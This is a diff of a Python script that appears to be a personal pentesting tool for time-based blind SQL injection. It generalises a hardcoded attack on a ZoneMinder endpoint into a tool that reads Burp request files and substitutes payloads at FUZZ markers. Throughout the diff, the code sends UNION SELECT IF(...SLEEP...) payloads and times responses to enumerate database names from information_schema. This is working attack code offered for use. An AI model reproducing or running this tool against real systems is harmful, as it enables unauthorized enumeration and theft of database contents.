@@ -1,12 +1,39 @@
 #!/bin/python3
 
-uri = ''
-
+import Burpee.burpee as burpee
 import requests
 import string
 import time
+from enum import Enum
+import re
+import argparse
 
-waitTime = 2
+class Type(Enum):
+    BLIND = 1
+    ERROR = 2
+
+
+#  parse args
+parser = argparse.ArgumentParser(description='python testsqli.py -u url -r request.req -w wordlist')
+parser.add_argument('-u', '--url', default='', required=True)
+parser.add_argument('-r', '--request', required=True)
+args = parser.parse_args()
+args.url = re.sub('/*$', '', args.url)  # strip trailing / on url
+
+
+
+# ## TMP
+# args = {}
+# args['url'] = 'http://192.168.69.63:450/'
+# args['request'] = 'login.req'
+# ## END TMP
+
+
+# parse burp .req
+headers , post_data = burpee.parse_request(args.request)
+method_name , resource_name = burpee.get_method_and_resource(args.request)
+
+
 
 # get databases
 
@@ -18,23 +45,29 @@ waitTime = 2
 
 # LIKE BINARY "%" 
 
+
+waitTime = .2
+proxies = {}
+
+
+def replace_injection_params(obj, payload):
+    for key in obj.keys():
+        obj[key] = obj[key].replace('FUZZ', payload)
+    return obj
+
+
 def check(sqli):
-    url = 'http://192.168.80.52/zm/index.php'
+    modified_resource_name = resource_name.replace('FUZZ', sqli)
+    modified_headers = replace_injection_params(headers, sqli)
+    modified_post_data = post_data.replace('FUZZ', sqli)
 
-    params = {
-        'view':'request',
-        'request':'log',
-        'task':'query',
-        'limit':'1'+sqli
-    }
-    
-    start = time.time()
-    resp = requests.post(url, data=params)
-    end = time.time()
+    if method_name.lower() == "get":
+        resp = requests.get(url = args.url + modified_resource_name , headers = modified_headers , proxies = proxies , verify = False)
+    elif method_name.lower() == "post":
+        resp = requests.post(url = args.url + modified_resource_name, headers = modified_headers , data = modified_post_data , proxies = proxies , verify = False)
 
-    respTime = end - start
 
-    if (respTime > waitTime):
+    if (resp.elapsed.total_seconds() > waitTime):
         return True
     else:
         return False
@@ -74,7 +107,7 @@ def getDatabases():
     for x in dictionary: 
         match_bases.insert(0, x.replace('_', '\_'))
 
-    match_bases = ['information\_sch']
+    match_bases = ['b']
 
     while match_bases:
         base = match_bases.pop() 
@@ -83,13 +116,13 @@ def getDatabases():
             print(matchStr)
 
             # check exact
-            sqli = ';SELECT IF((SELECT COUNT(table_schema) FROM information_schema.tables WHERE table_schema LIKE "{}")>0, SLEEP({}), SLEEP(0))'.format(matchStr, waitTime)
+            sqli = '\' UNION SELECT IF((SELECT COUNT(table_schema) FROM information_schema.tables WHERE table_schema LIKE "{}")>0, SLEEP({}), SLEEP(0))'.format(matchStr, waitTime)
             if check(sqli):
                 print("Found database: {}".format(matchStr))
                 databases.append(matchStr)
                             
             # match like
-            sqli = ';SELECT IF((SELECT COUNT(table_schema) FROM information_schema.tables WHERE table_schema LIKE "{}%")>0, SLEEP({}), SLEEP(0))'.format(matchStr, waitTime)
+            sqli = '\' UNION SELECT IF((SELECT COUNT(table_schema) FROM information_schema.tables WHERE table_schema LIKE "{}%")>0, SLEEP({}), SLEEP(0))'.format(matchStr, waitTime)
             if check(sqli):
                 print('fount match: ' + matchStr)
                 match_bases.append(matchStr)
@@ -167,7 +200,7 @@ def getColumns(database, table):
 
 
 #### GET DATABASES
-# getDatabases()
+getDatabases()
 
 
 #### GET NUM ROWS
@@ -175,7 +208,7 @@ def getColumns(database, table):
 
 
 #### GET TABLES
-getTables('%')
+# getTables('%')
 
 
 #### GET COLUMNS
